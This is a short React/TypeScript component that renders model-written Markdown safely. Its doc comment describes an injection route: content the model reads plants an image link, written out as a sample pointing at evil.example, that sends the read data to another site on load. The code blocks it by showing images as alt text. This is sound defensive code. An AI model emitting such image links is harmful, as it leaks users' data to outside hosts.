import ReactMarkdown, { type Components } from "react-markdown";

/**
 * Markdown written by the model, which reads mail, notes and documents that anyone can put words into. An image would
 * load the moment it is shown, so a planted `![](https://evil.example/?d=…)` could carry what the model read to another
 * site without a click: images are shown as their alt text instead, and links open in a new tab without a referrer.
 */
const SAFE: Components = {
  img: ({ alt }) => (alt ? <span>{alt}</span> : null),
  a: ({ href, children }) => <a href={href} target="_blank" rel="noopener noreferrer nofollow">{children}</a>,
};

export function Markdown({ children, components }: { children: string; components?: Components }) {
  return <ReactMarkdown components={{ ...SAFE, ...components, img: SAFE.img }}>{children}</ReactMarkdown>;
}
